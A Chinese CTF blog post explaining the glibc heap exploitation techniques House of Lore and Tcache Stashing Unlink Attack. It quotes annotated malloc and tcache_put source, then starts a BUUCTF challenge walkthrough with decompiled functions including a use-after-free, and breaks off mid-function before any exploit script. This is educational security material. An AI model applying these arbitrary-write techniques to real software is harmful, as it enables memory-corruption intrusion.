<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Tcache Stashing Unlink Attack（House of Lore） | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>:root {
 --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
 --light-background: url('/img/bk.jpg');
 --theme-encrypt-confirm: 'confirm'
}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => bszCaller.fetch(
 "//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback", a => {
  bszTag.texts(a),
  bszTag.shows()
}));reset()})</script><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Tcache Stashing Unlink Attack（House of Lore）</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-10T15:14:29.000Z" id="date"> 2023-04-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-10-29T11:58:45.243Z" id="updated"> 2023-10-29</time></div></span><br><span>Word Count: <div class="control">3.7k</div></span><br><span>Read Time: <div class="control">17 min</div></span><br><span id="busuanzi_container_page_pv">Page View: <span class="control" id="busuanzi_value_page_pv">loading...</span></span></div></div><hr><div id="post-content"><p>如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：</p>
<p><strong>Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin</strong></p>
<h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><blockquote>
<p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。<br>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。<br>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
</blockquote>
<h1 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h1><blockquote>
<p>利用特性：<br>1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中<br>2.calloc函数分配堆块时不从tcache bin中选取。<br>3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写</p>
</blockquote>
<p>利用前提</p>
<figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.能控制 Small <span class="hljs-keyword">Bin </span>Chunk 的 <span class="hljs-keyword">bk </span>指针。<br><br><span class="hljs-number">2</span>.程序可以越过Tache取Chunk。(使用calloc即可做到)<br><br><span class="hljs-number">3</span>.程序至少可以分配两种不同大小且大小为unsorted <span class="hljs-keyword">bin的Chunk。</span><br></code></pre></td></tr></tbody></table></figure>

<h4 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h4><ol>
<li>向任意指定位置写入指定值。</li>
<li>向任意地址分配一个Chunk。</li>
</ol>
<h4 id="攻击前提"><a href="#攻击前提" class="headerlink" title="攻击前提"></a>攻击前提</h4><ol>
<li>能控制 Small Bin Chunk 的 bk 指针。</li>
<li>程序可以越过Tache取Chunk。(使用calloc即可做到)</li>
<li>程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。</li>
</ol>
<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>我们首先分析<code>House of Lore Attack</code>中所忽视的Tcache相关代码。</p>
<figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs xl">#<span class="hljs-keyword">if</span> USE_TCACHE <span class="hljs-comment">//如果程序启用了Tcache</span><br>        <span class="hljs-comment">/* While we're here, if we see other chunks of the same size,</span><br><span class="hljs-comment">        stash them in the tcache.  */</span><br>        <span class="hljs-comment">//遍历整个smallbin，获取相同size的free chunk</span><br>        size_t tc_idx = csize2tidx (nb);<br>        <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>        {<br>            mchunkptr tc_victim;<br>            <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>            <span class="hljs-comment">//判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。</span><br>            <span class="hljs-comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span><br>            <span class="hljs-function"><span class="hljs-title">while</span> ( tcache-&gt;</span>counts[tc_idx] &lt; mp_.tcache_count<br>                   &amp;&amp; (tc_victim = last (bin) ) != bin)<br>            {<br>                <span class="hljs-comment">//如果成功获取了Chunk</span><br>                <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>                {<br>                    <span class="hljs-comment">// 获取 small bin 中倒数第二个 chunk 。</span><br>                    <span class="hljs-function"><span class="hljs-title">bck</span> = tc_victim-&gt;</span>bk;<br>                    <span class="hljs-comment">//设置标志位</span><br>                    set_inuse_bit_at_offset (tc_victim, nb);<br>                    <span class="hljs-comment">// 如果不是 main_arena，设置对应的标志</span><br>                    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                        set_non_main_arena (tc_victim);<br>                    <span class="hljs-comment">//取出最后一个Chunk</span><br>                    <span class="hljs-function"><span class="hljs-title">bin</span>-&gt;</span>bk = bck;<br>                    <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = bin;<br>                    <span class="hljs-comment">//将其放入到Tcache中</span><br>                    tcache_put (tc_victim, tc_idx);<br>                }<br>            }<br>        }<br>#endif<br></code></pre></td></tr></tbody></table></figure>

<p>此处我们发现了一个很关键的情况！我们在此处没有经过<code>House of Lore</code>中必须经过的检查：</p>
<figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-constructor">__glibc_unlikely( <span class="hljs-params">bck</span>-&gt;<span class="hljs-params">fd</span> != <span class="hljs-params">victim</span> )</span> )<br>    malloc_printerr (<span class="hljs-string">"malloc(): smallbin double linked list corrupted"</span>);<br></code></pre></td></tr></tbody></table></figure>

<p>但是此处又有了矛盾的地方！</p>
<p><strong>首先，在引入Tcache后，Tcache中的Chunk拥有绝对优先权，我们不能越过Tcache向SmallBin中填入Chunk，也不能越过Tcache从SmallBin中取出Chunk。（除非Tcache已经处于FULL状态）</strong></p>
<p>然后，我们如果要在这里启动攻击，那么要求<code>SmallBin</code>中至少有两个Chunk(否则无法进入While中的if语句块)，<strong>同时要求Tcache处于非空状态。</strong></p>
<p>那样就产生了矛盾，导致这个漏洞看似无法利用。</p>
<p>但是<code>calloc</code>函数有一个很有趣的特性，它不会从<code>Tcache</code>拿<code>Chunk</code>，因此可以越过第一条矛盾“不能越过<code>Tcache</code>从<code>SmallBin</code>中取出<code>Chunk</code>”。</p>
<p>然后是<code>Unsorted Bin</code>的**<code>last remainder</code>**基址，当申请的Chunk大于<code>Unsorted Bin</code>中Chunk的大小且其为<code>Unsorted Bin</code>中的唯一<code>Chunk</code>时，该<code>Chunk</code>不会进入<code>Tcache</code>。</p>
<p>同时，我们来分析<code>tcache_put</code>函数</p>
<figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xl">static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx)<br>{<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br><br>  <span class="hljs-comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  <span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span>key = tcache;<br><br>  <span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span> = tcache-&gt;</span>entries[tc_idx];<br>  <span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>entries[tc_idx] = e;<br>  ++(<span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>counts[tc_idx]);<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>可以发现，<code>tcache_put</code>函数没有做任何的安全检查。</p>
<p>那么，当Tcache存在两个以上的空位时，程序会将我们的fake chunk置入Tcache。</p>
<h1 id="例题-BUUCTF-2020-新春红包题-3"><a href="#例题-BUUCTF-2020-新春红包题-3" class="headerlink" title="例题 BUUCTF-[2020 新春红包题]3"></a>例题 BUUCTF-[2020 新春红包题]3</h1><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>未开启canary保护，可能存在栈溢出</p>
<h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p>程序实现四个功能，增，删，查，改，还有一个栈溢出的函数</p>
<figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">void</span> __fastcall __noreturn main(char *<span class="hljs-built_in">a1</span>, char **<span class="hljs-built_in">a2</span>, char **<span class="hljs-built_in">a3</span>)<br>{<br>  char <span class="hljs-built_in">v3</span>[<span class="hljs-number">268</span>]<span class="hljs-comment">; // [rsp+0h] [rbp-110h] BYREF</span><br>  int <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+10Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">v4</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  sub_11D5()<span class="hljs-comment">;</span><br>  sub_1450()<span class="hljs-comment">;</span><br>  sub_1269()<span class="hljs-comment">;</span><br>  <span class="hljs-meta">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-meta">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      <span class="hljs-meta">while</span> ( <span class="hljs-number">1</span> )<br>      {<br>        menu()<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">v4</span> = readd()<span class="hljs-comment">;</span><br>        <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> != <span class="hljs-number">3</span> )<br>          break<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>        edit(<span class="hljs-built_in">v3</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>      }<br>      <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> &gt; <span class="hljs-number">3</span> )<br>        break<span class="hljs-comment">;</span><br>      <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> == <span class="hljs-number">1</span> )<br>      {<br>        <span class="hljs-meta">if</span> ( x1c &lt;= <span class="hljs-number">0</span> )<br>          exitt()<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>        add(<span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>        --x1c<span class="hljs-comment">;</span><br>      }<br>      <span class="hljs-meta">else</span><br>      {<br>        <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> != <span class="hljs-number">2</span> )<br>          goto LABEL_19<span class="hljs-comment">;</span><br>        <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>        delete(<span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>      }<br>    }<br>    <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> == <span class="hljs-number">5</span> )<br>      exitt()<span class="hljs-comment">;</span><br>    <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> &lt; <span class="hljs-number">5</span> )<br>    {<br>      <span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>      show(<span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>    }<br>    <span class="hljs-meta">else</span><br>    {<br>      <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> != <span class="hljs-number">666</span> )<br><span class="hljs-symbol">LABEL_19:</span><br>        exitt()<span class="hljs-comment">;</span><br>      stack_attack(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>

<h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。</p>
<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_1515</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input the red packet idx: "</span>);<br>  v4 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0x10</span> )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): "</span>);<br>  v3 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">2</span> )<br>  {<br>    size = <span class="hljs-number">0xF0</span>;<br>  }<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">2</span> )<br>  {<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>    {<br>      size = <span class="hljs-number">0x300</span>;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">4</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_14;<br>      size = <span class="hljs-number">0x400</span>;<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">1</span> )<br>    {<br>LABEL_14:<br>      size = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    }<br>    size = <span class="hljs-number">16</span>;<br>  }<br>LABEL_15:<br>  <span class="hljs-keyword">if</span> ( size != <span class="hljs-number">0x10</span> &amp;&amp; size != <span class="hljs-number">0xF0</span> &amp;&amp; size != <span class="hljs-number">0x300</span> &amp;&amp; size != <span class="hljs-number">0x400</span> )<br>    <span class="hljs-built_in">exitt</span>();<br>  *(<span class="hljs-number">16LL</span> * v4 + a1) = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, size);<br>  *(a1 + <span class="hljs-number">16LL</span> * v4 + <span class="hljs-number">8</span>) = size;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input content: "</span>);<br>  v2 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *(<span class="hljs-number">16LL</span> * v4 + a1), *(<span class="hljs-number">16LL</span> * v4 + a1 + <span class="hljs-number">8</span>));<br>  <span class="hljs-keyword">if</span> ( v2 &lt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-built_in">exitt</span>();<br>  *(v2 - <span class="hljs-number">1LL</span> + *(<span class="hljs-number">16LL</span> * v4 + a1)) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>

<h2 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h2><p>存在UAF</p>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">delete</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input the red packet idx: "</span>);<br>  v2 = <span class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0x10</span> || !*(<span class="hljs-number">16LL</span> * v2 + a1) )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">free</span>(*(<span class="hljs-number">16LL</span> * v2 + a1));                      <span class="hljs-comment">// uaf</span><br>                                                <span class="hljs-comment">// </span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>

<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次</p>
<figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> __fastcall sub_1740(__int64 <span class="hljs-built_in">a1</span>, __int64 <span class="hljs-built_in">a2</span>)<br>{<br>  void *<span class="hljs-built_in">v2</span><span class="hljs-comment">; // rsi</span><br>  int <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+18h] [rbp-8h]</span><br>  unsigned int <span class="hljs-built_in">v5</span><span class="hljs-comment">; // [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-meta">if</span> ( qword_4010 &lt;= <span class="hljs-number">0</span> )<br>    exitt(<span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>  --qword_4010<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">"Please input the red packet idx: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v5</span> = readd()<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v5</span> &gt; <span class="hljs-number">0x10</span> <span class="hljs-title">||</span> !*(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span>) )<br>    exitt(<span class="hljs-string">"Please input the red packet idx: "</span>, <span class="hljs-built_in">a2</span>)<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">"Please input content: "</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v2</span> = *(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v4</span> = read(<span class="hljs-number">0</span>, <span class="hljs-built_in">v2</span>, *(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span> + <span class="hljs-number">8</span>))<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v4</span> &lt;= <span class="hljs-number">0</span> )<br>    exitt(<span class="hljs-number">0</span>LL, <span class="hljs-built_in">v2</span>)<span class="hljs-comment">;</span><br>  *(<span class="hljs-built_in">v4</span> - <span class="hljs-number">1</span>LL + *(<span class="hljs-number">16</span>LL * <span class="hljs-built_in">v5</span> + <span class="hljs-built_in">a1</span>)) = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  return puts(<span class="hljs-string">"Done!"</span>)<span class="hljs-comment">;</span><br>}<br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_184E</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input the red packet idx: "</span>);<br>  v2 = <span 